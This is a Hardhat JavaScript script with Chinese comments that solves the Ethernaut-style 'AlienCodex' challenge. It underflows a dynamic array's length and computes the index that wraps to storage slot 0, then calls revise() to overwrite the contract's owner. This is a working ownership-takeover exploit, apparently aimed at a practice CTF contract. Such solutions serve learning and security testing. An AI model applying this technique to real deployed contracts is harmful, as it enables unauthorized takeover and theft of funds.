const { ethers, network } = require("hardhat");
const AlienCodex = require(`../../deployments/${network.name}/AlienCodex.json`);
let chobyn = require(`../../deployments/${network.name}/Chobyn.json`);
async function main() {
    let [owner] = await ethers.getSigners();
    let provider = owner.provider
    const Abi = [
        "function owner() external view returns (address)",
        "function make_contact() external",
        "function record(bytes32) external",
        "function retract() external",
        "function revise(uint, bytes32) external"
      ];
    let AlienContract = await new ethers.Contract(AlienCodex.address, Abi, owner);
    // -----------------------------------------------------
    // | unused(11 bytes) | contact = false  |  0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272       | <- slot 0
    // -----------------------------------------------------
    // | codex length =0       | <- slot 1
    // -----------------------------------------------------
    // ...
    // -----------------------------------------------------
    // | codex data[0]      | <- slot ??
    // -----------------------------------------------------

    // 动态数组的存储
    // 假设动态数组占用了slot[p]，动态数组元素的存储插槽在 `keccak256(bytes(p))+x`，其中x是数组下标

    // 正式开始hack
    // 1.先改变contract变量 `await contact.make_contact()`
    // await AlienContract.make_contact()
    // 2.计算`keccak256(bytes(p))`
    // 本案例p为1, keccak256(bytes(p)) = keccak256(bytes(1)) = index = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    // 如果想找codex[1]的下标，即keccak256(bytes(1))+ 1 = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf7
    let codexIndex = ethers.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001')
    // console.log(await provider.getStorageAt(AlienCodex.address, 0))
    // console.log(await provider.getStorageAt(AlienCodex.address, 1))
    // console.log(await provider.getStorageAt(AlienCodex.address, codexIndex))
    // 3.调用await contract.retract()将codex.length下溢出为2**256-1
    // codex数组长度溢出后，我们通过修改"数组末端下标+1"所产生的上溢出值，即为slot0的值
    let max = ((ethers.BigNumber.from(2)).pow(256)).sub(1)
    let index = ethers.BigNumber.from(codexIndex)
    let slot0Index = (max.sub(index)).add(1)
    console.log(await AlienContract.revise(slot0Index, chobyn.addressBytes))
    console.log(await AlienContract.owner())
}

main()
    .then(() =>process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
